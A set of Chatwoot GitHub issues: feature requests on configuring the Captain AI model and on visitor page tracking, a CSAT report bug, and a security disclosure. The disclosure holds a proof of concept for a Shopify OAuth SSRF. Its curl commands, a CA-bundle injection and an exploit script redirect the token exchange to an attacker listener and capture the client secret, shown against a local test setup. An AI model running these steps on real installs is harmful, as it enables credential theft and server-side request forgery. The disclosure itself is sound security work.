and never read the `CAPTAIN_OPEN_AI_MODEL` InstallationConfig that the Captain settings UI already writes. So even after pointing `CAPTAIN_OPEN_AI_ENDPOINT` at an OpenAI-compatible provider, the reply composer keeps requesting `gpt-4.1-mini` — which doesn't exist on providers like Groq — while there's no UI path to change it short of patching source.

### Describe the solution you'd like

Make `Captain::BaseTaskService::GPT_MODEL` resolve as `InstallationConfig.find_by(name: 'CAPTAIN_OPEN_AI_MODEL')&.value.presence || Llm::Config::DEFAULT_MODEL` — the same fallback already used in `enterprise/app/services/captain/llm/article_translation_service.rb` and `conversation_completion_service.rb`. This makes the model/endpoint configured once in Settings → Captain apply consistently across every AI feature Chatwoot ships, not only the agent/RAG side.

### Describe alternatives you've considered

- Editing `lib/llm/config.rb` directly — not viable on cloud or on self-hosted installs that auto-update the image (e.g. via Watchtower); the patch is lost on every update.
- Configuring the account-level OpenAI integration hook — only overrides the credential, not the model or endpoint used by these task services.

### Additional context

This would let teams use cheaper OpenAI-compatible providers (Groq, DeepSeek, Together AI) specifically for the reply composer actions without needing the paid Captain add-on — many self-hosted users rely on Improve Reply/Reply Suggestion far more than on Captain agents.

title: Add visitor page tracking for website inbox conversations
author: amirgh2249
body:
### Is your feature or enhancement related to a problem? Please describe.

When a visitor starts a conversation from the website live chat widget, agents do not have enough context about where the visitor currently is on the website or which pages they visited before starting the chat.

This makes support slower because agents often need to ask questions like “Which page are you on?” or “What were you trying to do?” even though this information could be available automatically.

This is especially useful for websites with multiple product pages, pricing pages, checkout pages, documentation pages, or support articles.


### Describe the solution you'd like

I would like Chatwoot website inboxes to show the visitor’s current page and page visit history to agents.

Ideally, agents should be able to see this information inside the conversation sidebar, contact details, or conversation context panel.

The feature could include:

Current page URL
Current page title
Previous pages visited in the same session
Visit timestamp for each page
A clear indicator for the visitor’s currently active page

For example, if a visitor viewed the pricing page, then opened the checkout page and started a chat, the agent should be able to see that the visitor is currently on the checkout page and previously visited the pricing page.

### Describe alternatives you've considered

One alternative is to use external analytics tools such as Google Analytics, Plausible, or custom tracking events. However, these tools are separate from Chatwoot and are not easily available to the support agent while replying to the conversation.

Another alternative is to manually ask the visitor which page they are on, but this adds friction and makes the support experience slower.

### Additional context

Many modern live chat platforms provide visitor activity or page tracking so agents can understand the user’s context before replying.

Adding this feature to Chatwoot website inboxes would help agents provide faster, more accurate support and reduce unnecessary back-and-forth with visitors.

title: [Security] Chatwoot Shopify OAuth SSRF + Credential Exfiltration
author: geo-chen
body:
### Describe the bug

https://github.com/chatwoot/chatwoot/security/advisories/GHSA-wxhm-4rjw-9m7v

Opened on 11 May with no responses.


### Summary
The Shopify OAuth callback endpoint constructs an `OAuth2::Client` using `params[:shop]` as the `site:` hostname without any validation. On code exchange, the OAuth2 gem POSTs to `https://{params[:shop]}/admin/oauth/access_token` with `client_id` and `client_secret` in both the request body and an `Authorization: Basic header`.
Any authenticated user (agent-level) can obtain a non-expiring state JWT and replay it with an arbitrary `shop=` value, redirecting the outbound POST to an attacker-controlled host and exfiltrating the Shopify app credentials.

### Details
Vulnerable code: 
```
# callbacks_controller.rb:48 — unvalidated user input
site: "https://#{params[:shop]}"

# integration_helper.rb:17-21 — no exp, no shop binding
def token_payload(account_id)
  { sub: account_id, iat: Time.current.to_i }
end
```



### To Reproduce

### PoC

#### Environment

| Item | Value |
|------|-------|
| Chatwoot image | `chatwoot/chatwoot:latest` (v3.x) |
| DB | `pgvector/pgvector:pg16` |
| Listener IP | `172.18.0.1` (Docker bridge host) |
| Listener port | `9443` (HTTPS) |
| Fake credentials | `SHOPIFY_CLIENT_ID=test_client_12345`, `SHOPIFY_CLIENT_SECRET=test_secret_99999` |

#### Setup

```bash
# 1. Start Chatwoot in Docker
cd vuln-pipeline/targets/chatwoot/docker-test
docker compose up -d

# 2. Create account and obtain API token (sign-up route disabled in prod image)
docker compose exec rails bundle exec rails runner "
  u = User.create!(name:'attacker', email:'attacker@evil.com',
        password:'P@ssw0rd1!', password_confirmation:'P@ssw0rd1!',
        account_id: 1, role: :administrator)
  Account.first.account_users.create!(user: u, role: :administrator)
"
TOKEN=$(curl -s -X POST http://localhost:3000/auth/sign_in \
  -H 'Content-Type: application/json' \
  -d '{"email":"attacker@evil.com","password":"P@ssw0rd1!"}' | \
  python3 -c "import sys,json; print(json.load(sys.stdin)['data']['access_token'])")

# 3. Set fake Shopify credentials in the DB
docker compose exec rails bundle exec rails runner "
  ['SHOPIFY_CLIENT_ID','SHOPIFY_CLIENT_SECRET'].zip(
    ['test_client_12345','test_secret_99999']
  ).each { |name, val|
    InstallationConfig.find_by(name: name)&.update!(value: val) ||
    InstallationConfig.create!(name: name, value: val, locked: false)
  }
"
```


#### Obtain State JWT

```bash
STATE=$(curl -s -X POST http://localhost:3000/api/v1/accounts/2/integrations/shopify/auth \
  -H "api_access_token: $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"shop_domain":"legitimate-shop.myshopify.com"}' | \
  python3 -c "
import sys, json, urllib.parse as u
redir = json.load(sys.stdin)['redirect_url']
print(u.parse_qs(u.urlparse(redir).query)['state'][0])
")
echo "State JWT: $STATE"
```

#### Inject TLS Certificate into Container

The OAuth2 gem verifies TLS. A self-signed cert for the listener IP must be trusted by the container:

```bash
# Generate cert with SAN=IP:172.18.0.1
openssl req -x509 -newkey rsa:2048 -nodes -days 1 \
  -keyout /tmp/poc.key -out /tmp/poc.crt \
  -subj "/CN=172.18.0.1" \
  -addext "subjectAltName=IP:172.18.0.1"

# Append to container CA bundle
cat /tmp/poc.crt | docker compose exec -T rails sh -c \
  'cat >> /etc/ssl/certs/ca-certificates.crt'
```

I have a PoC script that handles cert generation and injection automatically. Let me know if you need that. 

#### Fire the Exploit

```bash
python3 scripts/chatwoot-F01-validate.py \
  --base-url http://localhost:3000 \
  --token "$TOKEN" \
  --account-id 2 \
  --listen-ip 172.18.0.1 \
  --listen-port 9443 \
  --container chatwoot-docker-test-rails-1
```

#### Observed Output

```
============================================================
Chatwoot F01 — SSRF + Shopify Credential Exfiltration PoC
============================================================

[*] Requesting state JWT from http://localhost:3000/api/v1/accounts/2/integrations/shopify/auth
[+] State JWT obtained: eyJhbGciOiJIUzI1NiJ9.eyJzdWI...

[+] Self-signed cert written to /tmp/tmp.../chatwoot_poc.crt
[+] CA cert injected into container 'chatwoot-docker-test-rails-1'

[*] HTTPS listener started on 172.18.0.1:9443
[*] Firing callback: GET http://localhost:3000/shopify/callback
    shop=172.18.0.1:9443  code=weaponized

[+] VULNERABILITY CONFIRMED — Chatwoot POSTed credentials to attacker listener

    Path:          /admin/oauth/access_token
    Authorization: Basic dGVzdF9jbGllbnRfMTIzNDU6dGVzdF9zZWNyZXRfOTk5OTk=
    Decoded creds: test_client_12345:test_secret_99999

    SHOPIFY_CLIENT_ID     = test_client_12345
    SHOPIFY_CLIENT_SECRET = test_secret_99999

    POST body: code=weaponized&grant_type=authorization_code&redirect_uri=%2Fshopify%2Fcallback
```

The `Authorization: Basic` header is how the OAuth2 gem authenticates the token exchange - it base64-encodes `client_id:client_secret` and sends it as a header, exfiltrating both values in a single request.


### Impact
- **Credential theft**:  `SHOPIFY_CLIENT_SECRET` exfiltrated to attacker
- **SSRF**: server POSTs to arbitrary HTTPS URL (RFC-1918 reachable)
- **Token forgery**: stolen secret enables forging JWTs for any account
- **No expiry**: captured tokens are permanently reusable


### Expected behavior

_No response_

### Environment

Docker

### Cloud Provider

None

### Platform

None

### Operating system

_No response_

### Browser and version

_No response_

### Docker (if applicable)

_No response_

### Additional context

_No response_

title: CSAT report shows "No assigned agent" for conversations that were handled by agents
author: ThisIRFANBUTT
body: ### Describe the bug On the CSAT page, the Handled by column displays "No assigned agent" for every CSAT response. This is incorrect because these conversations were actually handled by our support agents, and the customers submitted their CSAT ratings after interacting with those agents. The conversations themselves have assigned agents, but the CSAT report does not display them. ### To Reproduce Automation 1: Unassign conversations when they are marked as Resolved. I do not believe this automation is related to the issue, as it has been in use without affecting CSAT previously. Automation 2: We have two departments: 1. Sales 2. Technical Customers choose the department from a pre-chat form using a custom attribute. An automation then checks the selected custom attribute and automatically assigns the conversation to the corresponding team: - If the customer selects Sales, the conversation is assigned to the Sales team. - If the customer selects Technical, the conversation is assigned to the Technical team. After implementing this second automation, the CSAT → Handled by column stopped displaying the assigned agent and instead shows "No assigned agent" for every CSAT response, even though the conversations were handled by agents and customers successfully submitted their ratings. This issue did not occur before adding the department assignment automation. ### Expected behavior The Handled by column should display the name of the agent who handled the conversation (or the last assigned agent responsible for the conversation). ### Environment app.chatwoot.com ### Cloud Provider None ### Platform None ### Operating system _No response_ ### Browser and version _No response_ ### Docker (if applicable) _No response_ ### Additional context _No response_
